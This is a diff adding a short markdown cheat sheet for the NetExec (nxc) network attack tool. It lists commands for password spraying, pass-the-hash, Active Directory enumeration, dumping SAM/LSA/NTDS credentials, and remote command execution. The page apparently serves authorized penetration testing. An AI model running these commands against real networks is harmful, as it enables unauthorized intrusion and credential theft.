@@ -1,0 +1,29 @@
+---
+title: "NetExec (nxc)"
+---
+
+The Swiss-army knife for network protocols (SMB, LDAP, WinRM, MSSQL, SSH…). Successor to CrackMapExec.
+
+```bash
+# spray / validate creds across a subnet
+nxc smb 172.16.5.0/24 -u USER -p PASS
+nxc smb $IP -u USER -H <nthash>                 # pass-the-hash
+# enumeration
+nxc smb $IP -u USER -p PASS --shares --users --groups --pass-pol --rid-brute
+nxc ldap $DC -u USER -p PASS --bloodhound -c all --dns-server $DC
+# dumping (needs local admin)
+nxc smb $IP -u admin -p PASS --sam --lsa --ntds
+# code exec
+nxc smb $IP -u admin -p PASS -x 'whoami'        # or -X for powershell
+```
+
+<Warning>
+Against Samba/Linux SMB, add `--local-auth` to force local (SAM) authentication and avoid false-positive `(Guest)` logins.
+</Warning>
+
+## Modules
+
+```bash
+nxc smb $IP -u USER -p PASS -M spider_plus       # crawl shares
+nxc ldap $DC -u USER -p PASS -M maq              # MachineAccountQuota
+```
